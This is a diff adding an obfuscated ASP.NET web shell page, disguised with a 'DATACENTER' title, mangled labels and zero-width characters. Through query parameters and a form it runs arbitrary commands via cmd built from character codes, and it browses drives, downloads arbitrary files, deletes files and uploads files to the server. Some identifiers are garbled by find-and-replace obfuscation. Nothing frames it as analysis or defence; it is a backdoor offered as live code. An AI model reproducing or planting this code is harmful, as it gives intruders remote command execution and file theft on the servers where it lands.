@@ -1,0 +1,210 @@
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="S\u200Cystem.Diag\u200Cnostics" %>
+<%@ Import Namespace="System.IO" %>
+
+<script runat="server">
+    public static string codifica_site(string value)
+    {
+        StringBuilder result = new StringBuilder();
+        foreach (char symbol in value)
+        {
+            if (char.IsLetterOrDigit(symbol) || symbol == '-' || symbol == '_' || symbol == '.' || symbol == '~')
+            {
+                result.Append(symbol);
+            }
+            else
+            {
+                result.Append('%' + String.Format("{0:X2}", (int)symbol));
+            }
+        }
+        return result.ToString();
+    }
+
+    public static string crea_web(string value)
+    {
+        StringBuilder result = new StringBuilder();
+        foreach (char symbol in value)
+        {
+            switch (symbol)
+            {
+                case '<':
+                    result.Append("&lt;");
+                    break;
+                case '>':
+                    result.Append("&gt;");
+                    break;
+                case '&':
+                    result.Append("&amp;");
+                    break;
+                case '"':
+                    result.Append("&quot;");
+                    break;
+                case '\'':
+                    result.Append("&#39;");
+                    break;
+                default:
+                    result.Append(symbol);
+                    break;
+            }
+        }
+        return result.ToString();
+    }
+</script>
+
+<%
+
+  string outstr = "";
+  
+  string tonto = Page.MapPath(".") + "/";
+  if (Request.QueryString["directo"] != null)
+    tonto = Request.QueryString["directo"] + "/";
+  tonto = tonto.Replace("\\", "/");
+  tonto = tonto.Replace("//", "/");
+  
+  string[] dirparts = tonto.Split('/');
+  string caminarsobre = "";  
+  foreach (string mejorparte in dirparts)
+  {
+    if (mejorparte.Length == 0)
+      continue;
+    caminarsobre += mejorparte + "/";
+    outstr += string.Format("<a href='?directo={0}'>{1}/</a>&nbsp;",
+                  codifica_site(caminarsobre),
+                  crea_web(mejorparte));
+  }
+  lb_lPat_h.Text = outstr;
+  
+  outstr = "";
+  foreach(DriveInfo disco in DriveInfo.GetDrives())
+  {
+    if (!disco.IsReady)
+      continue;
+    string driveRoot = disco.RootDirectory.Name.Replace("\\", "");
+    outstr += string.Format("<a href='?directo={0}'>{1}</a>&nbsp;",
+                  codifica_site(driveRoot),
+                  crea_web(driveRoot));
+  }
+  l_blDr_ives.Text = outstr;
+
+  if ((Request.QueryString["obtener"] != null) && (Request.QueryString["obtener"].Length > 0))
+  {
+    Response.ClearContent();
+    Response.WriteFile(Request.QueryString["obtener"]);
+    Response.End();
+  }
+
+  if ((Request.QueryString["despedir"] != null) && (Request.QueryString["despetonto"].Length > 0))
+    File.Delete(Request.QueryString["despedir"]);  
+
+  if(flUp.HasFile)
+  {
+    string fileName = flUp.FileName;
+    int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
+    if (splitAt >= 0)
+      fileName = flUp.FileName.Substring(splitAt);
+    flUp.SaveAs(tonto + "/" + fileName);
+  }
+
+  DirectoryInfo di = new DirectoryInfo(tonto);
+  outstr = "";
+  foreach (DirectoryInfo curdir in di.GetDirectories())
+  {
+    string fstr = string.Format("<a href='?directo={0}'>{1}</a>",
+                  codifica_site(tonto + "/" + curdir.Name),
+                  crea_web(curdir.Name));
+    outstr += string.Format("<tr><td>{0}</td><td><DIR></td><td></td></tr>", fstr);
+  }
+  foreach (FileInfo curfile in di.GetFiles())
+  {
+    string fstr = string.Format("<a href='?obtener={0}' tarobtener='_blank'>{1}</a>",
+                  codifica_site(tonto + "/" + curfile.Name),
+                  crea_web(curfile.Name));
+    string astr = string.Format("<a href='?directo={0}&despedir={1}'>Del</a>",
+                  codifica_site(tonto),
+                  codifica_site(tonto + "/" + curfile.Name));
+    outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
+  }
+  lblDirOut.Text = outstr;
+
+  if (txtc0min.Text.Length > 0)
+  {
+      ProcessStartInfo startInfo = new ProcessStartInfo();
+      {
+          startInfo.Fi\u200DleName = "" + (char)99 + (char)109 + (char)100;
+          startInfo.Arguments = "" + (char)47 + (char)107 + " " + txtc0min.Text + " " + (char)38 + " " + (char)101 + (char)120 + (char)105 + (char)116;
+          startInfo.UseSh\u200EellExecute = false;
+          startInfo.RedirectStandardOutput = true;
+          startInfo.RedirectStandardError = true;
+          startInfo.CreateNoWindow = true;
+          startInfo.WorkingDirectory = tonto;
+      };
+
+	  using (Process process = Pro\u200Dcess.Start(startInfo))
+      {
+          using (StreamReader reader = pro\u200Dcess.StandardOutput)
+          {
+              lbldmCOut.Text = reader.ReadToEnd();
+          }
+      }
+
+      txtc0min.Text = "";
+  }
+%>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+  <title>TABLE</title>
+  <style type="text/css">
+    * { font-family: Arial; font-size: 12px; }
+    body { margin: 0px; }
+    pre { font-family: Courier New; background-color: #CCCCCC; }
+    h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
+    h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
+    th { text-align: left; background-color: #99CC99; }
+    td { background-color: #CCFFCC; }
+    pre { margin: 2px; }
+  </style>
+</head>
+<body>
+  <h1>DATACENTER</h1>
+    <form id="form1" runat="server">
+    <table style="width: 100%; border-width: 0px; padding: 5px;">
+    <tr>
+      <td style="width: 50%; vertical-align: top;">
+        <h2>Sell</h2>        
+        <asp:TextBox runat="server" ID="txtc0min" Width="300" />
+        <asp:Button runat="server" ID="dmccexE" Text="Execute" />
+        <pre><asp:Literal runat="server" ID="lbldmCOut" Mode="Encode" /></pre>
+      </td>
+      <td style="width: 50%; vertical-align: top;">
+        <h2>life Browser</h2>
+        <p>
+          Drives:<br />
+          <asp:Literal runat="server" ID="l_blDr_ives" Mode="PassThrough" />
+        </p>
+        <p>
+          Work ing directory:<br />
+          <b><asp:Literal runat="server" ID="lb_lPat_h" Mode="passThrough" /></b>
+        </p>
+        <table style="width: 100%">
+          <tr>
+            <th>Name</th>
+            <th>Size KB</th>
+            <th style="width: 50px">Actions</th>
+          </tr>
+          <asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
+        </table>
+        <p>Upl to this tontoe ctory:<br />
+        <asp:FileUpload runat="server" ID="flUp" />
+        <asp:Button runat="server" ID="dmcUpload" Text="Upl" />
+        </p>
+      </td>
+    </tr>
+    </table>
+
+    </form>
+</body>
+</html>
